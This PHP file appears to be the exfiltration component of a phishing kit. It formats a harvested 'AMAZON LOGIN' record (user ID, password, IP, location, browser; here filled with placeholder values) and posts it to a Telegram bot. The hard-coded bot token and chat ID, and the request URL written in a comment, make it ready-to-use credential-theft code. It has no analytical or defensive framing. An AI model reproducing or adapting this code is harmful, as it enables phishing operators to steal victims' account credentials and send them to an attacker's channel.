<?php

$message  = "--------------------[ AMAZON LOGIN ]-------------------------\n"."User ID    : sdfsdf\n"."Password   : sdfsdf\n"."--------------------------[ PC INFORMATION ]-------------------------\n"."IP Address   : sdfsdfsdf\n"."ISP        : sdfsdfsdfsdf\n"."Region       : sdfsdfsdf\n"."City       : sdfsdfsdf\n"."Continent    : sdfsdf\n"."Timezone   : sdfff\n"."OS/Browser   : sdfsf\n"."Date     : sdfsdf\n"."User Agent   : sdfd\n"."--------------------------[ Cyz4rine Inc. ]-----------------------------\n";
  $botToken="1155984802:AAExkP-UwvjUCNXjE0v6vfeDnsTPy1OpbvI"; // Your bot ID:TOKEN 
$chatId="860630235";  // Your Telegram ID 
#https://api.telegram.org/bot1155984802:AAExkP-UwvjUCNXjE0v6vfeDnsTPy1OpbvI/sendMessage?chat_id=860630235&text=aaaaa
  $website="https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".urlencode($message);
  $ch = curl_init($website);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);